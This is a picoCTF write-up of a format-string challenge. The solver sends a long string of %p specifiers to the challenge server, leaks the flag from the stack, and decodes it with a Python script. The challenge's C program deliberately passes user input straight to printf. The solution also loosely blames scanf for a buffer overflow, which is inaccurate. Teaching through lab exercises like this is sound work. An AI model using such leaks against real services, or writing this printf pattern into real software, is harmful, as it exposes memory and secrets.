# Description: 
I'm just copying and pasting with this `program`. What can go wrong? 

You can view source `here`. And connect with it using: `nc saturn.picoctf.net 60610`

This is the program provided:
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
```
# Solution:
The challenge involves a vulnerability or task with specific lines of code:
scanf("%127s", story); is used to read input, potentially vulnerable to buffer overflow or input manipulation.
The pointer buf in the _readflag_ function is associated with reading and storing the contents of the flag.txt file.
the %p format specifier to print the address of the buf pointer in hexadecimal. This can be useful for examining memory or exploiting format string vulnerabilities.
> Last login: Wed Dec 11 22:20:11 on ttys000
> apurva@Deepas-MacBook-Air ~ % nc saturn.picoctf.net 57874
> Tell me a story and then I'll tell you one >> %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%
> Here's a story - 
> 0xffd6ce500xffd6ce700x80493460x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x2570250x80483380xf4114d200xf3f99ab00x6f6369700x7b4654430x6b34334c0x5f676e310x67346c460x6666305f0x3474535f0x395f6b630x303666350x7d3731360xfbad20000xbe3fc700(nil)0xf41509900x804c0000x8049410(nil)0x804c0000xffd6cf380x80494180x20xffd6cfe4
> apurva@Deepas-MacBook-Air ~ % 
inputted %p 128 times since the story's length is 128 then converted this address to its raw value aka UTF-8 using codechef.
> To extract and convert the raw memory addresses from the output you provided, we need to isolate the hexadecimal values (0x...) that are valid addresses, ignoring any invalid ones (like (nil) or sequences without proper 0x prefixes).
> Then i converted each hex value into ASCII which lead me to realise i had to reverse each block of 4 charecters. Used GPT to write some python code to do so (attached below)
> # Encoded flag values as provided
encoded_flag_hex = [
    0x6f636970, 0x7b465443, 0x6b34334c, 0x5f676e31, 0x67346c46,
    0x6666305f, 0x3474535f, 0x395f6b63, 0x30366635, 0x7d373136
]

# Function to decode the flag
def decode_flag(encoded_hex):
    decoded_flag = ""
    for hex_value in encoded_hex:
        # Convert hex to a string
        chars = f"{hex_value:08x}"  # Ensure 8 characters for proper grouping
        # Reverse each block of 4 characters and append to the decoded flag
        reversed_block = chars[6:8] + chars[4:6] + chars[2:4] + chars[0:2]
        decoded_flag += bytes.fromhex(reversed_block).decode('ascii')
    return decoded_flag

# Decode the flag
decoded_flag = decode_flag(encoded_flag_hex)
decoded_flag

Which then gave me the decoded flag.

# Flag:
> picoCTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}



